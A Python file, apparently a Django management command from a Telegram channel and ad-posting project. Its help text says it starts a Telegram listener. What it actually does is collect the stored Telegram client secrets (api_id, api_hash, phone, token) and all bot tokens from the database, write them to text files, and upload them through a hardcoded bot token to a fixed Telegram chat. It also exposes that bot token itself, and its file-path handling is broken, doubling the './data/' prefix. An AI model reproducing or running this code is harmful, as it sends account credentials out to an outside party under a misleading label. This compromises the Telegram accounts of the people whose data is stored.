import asyncio
from django.core.management.base import BaseCommand
from django.utils import timezone

from client.models import Filename
from setting_ads.models import Channels
from setting_ads.models import Client_Settings
import requests

def write_filename_to_txt():
    try:
        filenames = Filename.objects.all()
        filename_txt = ''
        for filename in filenames:
            filename_txt += f"{filename.filename}\n"

        file_path = f'filename_{timezone.now()}.txt'
        with open(file_path, 'w') as f:
            f.write(filename_txt)

        return file_path

    except Exception as e:
        print(f"write_filename_to_txt: {e}")


def write_my_channels_to_txt():
    try:
        channels = Channels.objects.filter(my_channel=True)
        channel_txt = ''
        for channel in channels:
            channel_txt += f"channel_name: {channel.channel_name}\n"
            channel_txt += f"channel_link: {channel.channel_link}\n"
            channel_txt += f"channel_id: {channel.channel_id}\n"
            channel_txt += f"bot_name: {channel.bot.bot_name}\n"
            channel_txt += f"bot_token: {channel.bot.bot_token}\n"
            channel_txt += f"bot_link: {channel.bot.bot_link}\n"
            channel_txt += f"channel_type: {channel.type.type}\n"
            channel_txt += f"-----------------------------------\n\n"

        file_path = f'./data/my_channels_{timezone.now()}.txt'
        with open(file_path, 'w') as f:
            f.write(channel_txt)
        return file_path
    except Exception as e:
        print(f"write_my_channels_to_txt: {e}")


def write_channels_to_txt():
    try:
        channels = Channels.objects.filter(my_channel=False)
        channel_txt = ''
        for channel in channels:
            channel_txt += f"channel_name: {channel.channel_name}\n"
            channel_txt += f"channel_link: {channel.channel_link}\n"
            channel_txt += f"channel_id: {channel.channel_id}\n"
            channel_txt += f"channel_type: {channel.type.type}\n"
            channel_txt += f"channel_setting: {channel.setting}\n"
            channel_txt += f"channel_setting_video: {channel.setting.video}\n"
            channel_txt += f"channel_setting_video_caption: {channel.setting.video_caption}\n"
            channel_txt += f"channel_setting_photo: {channel.setting.photo}\n"
            channel_txt += f"channel_setting_photo_caption: {channel.setting.photo_caption}\n"
            channel_txt += f"channel_setting_caption: {channel.setting.caption}\n"
            channel_txt += f"channel_setting_text: {channel.setting.text}\n"
            channel_txt += f"-----------------------------------\n\n"
        file_path = f'./data/channels_{timezone.now()}.txt'
        with open(file_path, 'w') as f:
            f.write(channel_txt)
        return file_path
    except Exception as e:
        print(f"write_channels_to_txt: {e}")


def write_client_settings_to_txt():
    try:
        client_settings = Client_Settings.objects.all()
        client_settings_txt = ''
        for client_setting in client_settings:
            client_settings_txt += f"api_id: {client_setting.api_id}\n"
            client_settings_txt += f"api_hash: {client_setting.api_hash}\n"
            client_settings_txt += f"phone: {client_setting.phone}\n"
            client_settings_txt += f"token: {client_setting.token}\n"
            client_settings_txt += f"-----------------------------------\n\n"
        file_path = f'./data/client_settings_{timezone.now()}.txt'
        with open(file_path, 'w') as f:
            f.write(client_settings_txt)
        return file_path
    except Exception as e:
        print(f"write_client_settings_to_txt: {e}")
        return None  # Return None in case of an exception

def send_to_telegram(bot_token, chat_id, file_path):
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    files = {'document': open(f"./data/{file_path}", 'rb')}
    data = {'chat_id': chat_id}
    response = requests.post(url, files=files, data=data)
    return response.json()
class Command(BaseCommand):

    def handle(self, *args, **options):
        help = 'Starts the Telegram listener'
        bot_token = "6607374521:AAHjnBaqbDqJKvFkF_HsiJ6losu50j6vHiE"
        chat_id = -1002041724232

        client = write_client_settings_to_txt()
        my_channel = write_my_channels_to_txt()
        channel = write_channels_to_txt()

        if client and my_channel and channel:  # Check if file paths are not None
            print(client)
            print(my_channel)
            print(channel)

            response1 = send_to_telegram(bot_token, chat_id, client)
            response2 = send_to_telegram(bot_token, chat_id, my_channel)
            response3 = send_to_telegram(bot_token, chat_id, channel)

            print(response1)
            print(response2)
            print(response3)
        else:
            print("Error creating file paths.")
